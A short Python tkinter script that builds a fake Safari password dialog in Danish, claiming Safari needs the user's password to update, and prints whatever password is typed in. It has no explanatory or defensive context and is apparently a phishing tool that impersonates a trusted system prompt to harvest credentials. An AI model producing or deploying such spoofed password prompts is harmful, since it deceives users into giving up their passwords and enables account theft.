import tkinter
from PIL import ImageTk, Image
import os
size = ['440', '165']


def getpass():
    passwd = pwdfield.get()
    print(passwd)


mainwindow = tkinter.Tk()
mainwindow.geometry(size[0]+'x'+size[1])
mainwindow.title('Safari skal bruge din adgangskode')

pwdfield = tkinter.Entry(mainwindow, width=27, show='•')
pwdfield.place(x=165, y=80)

ok = tkinter.Button(mainwindow, text='OK', width=5, command=getpass)
ok.place(x=350, y=120)

cancel = tkinter.Button(mainwindow, text='Cancel', width=5)
cancel.place(x=270, y=120)

what = tkinter.Label(mainwindow, text='Password:')
what.place(x=90, y=83)

minspec = tkinter.Label(mainwindow, text='Venligst intast din adgangskode.')
minspec.place(x=90, y=60)
minspec.config(font=("Lucida Grande", 10))

spec = tkinter.Label(mainwindow, text='Safari skal bruge din adgangskode\ntil at opdatere.', justify='left')
spec.config(font=('Lucida Grande bold', 14))
spec.place(x=90, y=20)


image = ImageTk.PhotoImage(Image.open('/compass.jpg'.format(os.getcwd())))
panel = tkinter.Label(mainwindow, image=image)
panel.pack()
panel.place(x=0, y=0)

mainwindow.mainloop()
